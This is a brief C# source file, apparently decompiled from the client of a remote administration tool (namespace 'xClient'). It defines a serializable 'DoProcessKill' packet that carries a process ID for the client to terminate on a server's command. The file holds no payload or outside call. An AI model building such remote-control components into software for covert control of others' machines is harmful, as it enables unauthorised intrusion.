using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoProcessKill : GInterface4
{
	public int PID { get; set; }

	public DoProcessKill()
	{
	}

	public DoProcessKill(int pid)
	{
		PID = pid;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
